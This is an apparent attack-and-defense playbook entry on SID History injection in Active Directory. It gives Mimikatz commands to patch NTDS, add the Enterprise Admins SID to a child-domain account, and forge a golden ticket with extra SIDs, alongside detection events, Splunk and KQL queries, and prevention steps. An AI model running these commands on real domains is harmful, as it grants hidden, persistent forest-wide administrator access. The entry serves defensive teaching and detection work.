name: SID History Injection - Cross-Domain Persistence
description: SID History injection adds the SID of a privileged group (e.g., Enterprise Admins S-...-519) from a parent domain into a user account in a child domain. The injected SID is included in the users Kerberos ticket, granting them access to resources in the parent domain without being a member of those groups. Survives password resets.
notes:
=== THE IDEA ===
SID History was designed for domain migrations - when a user moves
from Domain A to Domain B, their old SID is preserved in SIDHistory
so they keep access to old resources. Attackers abuse this to inject
privileged SIDs from a parent domain into child domain accounts.

=== INJECT WITH MIMIKATZ ===
  # Requires DA on the child domain + patching NTDS
  mimikatz# privilege::debug
  mimikatz# sid::patch
  mimikatz# sid::add /sam:TargetUser /new:S-1-5-21-<parent_EA_sid>-519
  # 519 = Enterprise Admins

=== INJECT VIA GOLDEN TICKET ===
  # Alternative: include SID in a forged ticket
  mimikatz# kerberos::golden /user:TargetUser /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-<parent_EA_sid>-519 /ptt

=== VERIFY ===
  # Check SID History on the account:
  Get-ADUser TargetUser -Properties SIDHistory | Select SIDHistory
  # The user now has EA privileges when accessing parent domain resources

=== WHY ITS POWERFUL ===
- Survives password resets
- Not visible in standard group membership queries
- Works across domain boundaries within the forest
- The SID is embedded in the Kerberos PAC

examples.label: Inject Enterprise Admin SID into user

recommended.note: DCShadow can inject SID History stealthily via replication.
Golden Tickets can include extra SIDs for cross-domain access.

defense.why_it_works: The SIDHistory attribute is included in the Kerberos PAC without further validation by the parent domain. A child domain DA can inject any SID, and the parent domain trusts it.
defense.prerequisites: Domain Admin on the child domain; knowledge of the parent domain SID.
defense.impact: Persistent cross-domain privilege escalation; effectively Enterprise Admin without group membership.
defense.detection: [MITRE T1134.005] Event 4765/4766 (SID History added); accounts with SIDHistory containing privileged SIDs.
defense.artifacts: Event 4765 (SID History added to account); SIDHistory attribute on user objects; unusual cross-domain access patterns.
defense.splunk_spl:
index=windows EventCode IN (4765, 4766)
| table _time, TargetUserName, SidHistory, SubjectUserName
defense.sentinel_kql:
SecurityEvent
| where EventID in (4765, 4766)
| project TimeGenerated, TargetUserName, SubjectUserName, SidHistory
defense.prevention: Enable SID Filtering on trusts; monitor SIDHistory attribute changes; audit Event 4765/4766; restrict Domain Admin usage.

detections.name: SID History injection on user account
detections.logic:
SecurityEvent
| where EventID in (4765, 4766)
| project TimeGenerated, TargetUserName, SubjectUserName, SidHistory
| extend InjectedSID = tostring(SidHistory)
detections.tuning: Any SID History modification outside of planned migrations should trigger an alert
